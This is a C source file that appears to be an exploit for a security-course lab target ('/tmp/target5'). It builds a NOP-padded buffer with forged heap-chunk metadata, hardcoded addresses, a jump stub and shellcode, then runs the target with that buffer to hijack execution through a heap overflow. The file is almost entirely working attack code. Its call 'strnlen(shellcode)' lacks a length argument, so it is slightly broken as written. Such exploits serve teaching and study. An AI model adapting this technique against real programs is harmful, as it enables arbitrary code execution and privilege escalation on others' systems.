#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define MEM_START_OFFSET 392
#define NOP                            0x90

//changed the 76 to 77, which will be changed back by the clear freebit

static char attack[] =
  "\xbb\xbb\xbb\xbb"
  "\xff\xff\xff\xff"
  "\x60\x9d\x04\x08"
  "\x5c\xfa\xff\xbf"
;

static char vh_jump[] = "\xeb\x0c\x90\x90\xff\xff\xff\xff";

int main(void)
{
  char *args[3];
  char *env[1];

  char *buff, *ptr;

  long * addr_ptr;

  int i,shell_code_len, bsize = 1024;

  if (!(buff = malloc(bsize)))
    exit(1);

  // init the buffer to NOPs
  memset(buff, NOP, bsize);

  shell_code_len = strnlen(shellcode);

  /* ptr = buff + MEM_START_OFFSET + 8; */

  /* printf("Copy shellcode to addr: 0x%x\n", ptr); */

  /* memcpy(ptr, shellcode, strlen(shellcode)); */

  /* //set q = address of shellcode */

  /* ptr = buff + MEM_START_OFFSET; */

  /* addr_ptr = (long * )ptr; */

  /* *addr_ptr = 0x8049d60; */
  /* addr_ptr++; */
  /* *addr_ptr = 0x8049d60; */

  ptr = buff + MEM_START_OFFSET;
  memcpy(ptr, attack, strlen(attack));

  ptr = ptr + strlen(attack);
  memcpy(ptr, vh_jump, strlen(vh_jump));

  ptr = ptr + strlen(vh_jump) + 16;
  memcpy(ptr, shellcode, strlen(shellcode));

  buff[bsize - 1] = '\0';

  // Args
  args[0] = TARGET;
  args[1] = buff;
  args[2] = NULL;

  // Environment
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
